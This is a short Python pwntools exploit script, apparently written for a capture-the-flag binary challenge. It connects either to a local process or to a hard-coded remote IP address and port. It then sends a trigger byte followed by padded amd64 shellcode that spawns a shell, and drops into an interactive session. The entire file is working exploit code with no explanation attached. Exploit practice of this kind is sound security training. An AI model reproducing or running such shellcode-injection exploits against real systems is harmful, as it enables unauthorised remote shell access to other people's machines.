#!/usr/bin/python3

from pwn import *

exe = ELF('challenge', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('3.142.53.224', 7007)
else:
        p = process(exe.path)
shell = asm(shellcraft.amd64.linux.sh())
GDB()
s("H")
sleep(1)
s(shell.ljust(0x1000, b'\0'))
p.interactive()
